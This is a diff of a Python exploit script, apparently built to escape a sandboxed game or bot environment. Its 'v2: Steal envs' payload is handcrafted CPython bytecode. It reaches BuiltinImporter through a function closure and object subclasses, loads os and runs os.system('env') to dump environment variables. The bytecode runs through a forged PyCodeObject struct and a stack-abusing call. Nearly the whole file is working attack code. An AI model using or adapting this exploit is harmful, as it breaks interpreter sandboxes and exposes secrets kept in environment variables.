@@ -1,37 +1,21 @@
-# Need to use something other than blocks to ensure we have control of the stack
-# when we jump.
-# def break_it():
-#     a = 1
-#     for r in [0]:
-#         {}
-#     for r in [0]:
-#         {}
-#         {}
-#         {}
-#         {}
-#         {}
-#         {}
-#         {}
-        
-#     def dummy():
-#         pass
-#     def dummy2():
-#         pass
-#     def dummy3():
-#         pass
-#     def evil():
-#         log("a")
-#     evil()
-
-payload_consts = (None, 'hello world')
-log('consts addr ' + str(hex(id(payload_consts))))
-payload_names = ('log',)
-payload = b't\x00d\x01\x83\x01d\x00S\x00'
+# v2: Steal envs
+payload_consts = (None, 0, 'BuiltinImporter', 'os', 'env')
+payload_names = ('get_board_size', '__closure__', 'cell_contents', '__class__', '__bases__', '__subclasses__', '__name__', 'load_module', 'system')
+payload_varnames = ('subs', 'Importer', 'sub', 'imp')
+payload = b't\x00j\x01d\x01\x19\x00j\x02j\x03j\x04d\x01\x19\x00\xa0\x05\xa1\x00}\x00d\x00}\x01x\x1c|\x00D\x00]\x14}\x02|\x02j\x06d\x02k\x02r"|\x02}\x01P\x00q"W\x00|\x01\x83\x00}\x03|\x03\xa0\x07d\x03\xa1\x01\xa0\x08d\x04\xa1\x01\x01\x00d\x00S\x00'
+# v1: Print closure
+# payload_consts = (None,)
+# payload_names = ('log', 'str', 'get_board_size','__closure__')
+# payload = b't\x00t\x01t\x02j\x03\x83\x01\x83\x01d\x00S\x00'
+# v0: Hello world
+# payload_consts = (None, 'hello world')
+# payload_names = ('log',)
+# payload = b't\x00d\x01\x83\x01d\x00S\x00'
 evil_struct = {
     'code': payload,
     'consts': payload_consts,
     'names': payload_names,
-    'varnames': (),
+    'varnames': payload_varnames,
     'freevars': (),
     'cellvars': (),
     'filename': '<dummy>',
@@ -75,7 +59,6 @@ def make_payload():
             out = out + all_bytes[p % 256]
             p = p // 256
         return out
-    log('consts addr ' + str(hex(id(evil_struct['consts']))))
     evil_array = (
         b'\x00\x00\x00\x00' + # flags
         b'\x9a\x02\x00\x00' + # first line no = 666
@@ -103,7 +86,7 @@ def make_payload():
     evil_array = test_evil_array
     return evil_array
 
-# This almost works, but unclear how to construct C-backed code object in payload
+# Call into hacked C struct mimicking PyCodeObject
 def call_code(payload, nargs):
     a = True + (True if True or False else False)
     {}
@@ -119,13 +102,11 @@ def call_code(payload, nargs):
     {}
     def evil():
         pass
-    args = [0]*nargs
-    evil(*args)
+    evil(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+         0,0,0,0,0,0,0,0,0)
 
 def turn():
-    # break_it()
     evil_array = make_payload()
-    # log('here!')
-    # import time
-    # time.sleep(3)
     call_code(evil_array, len(evil_array))
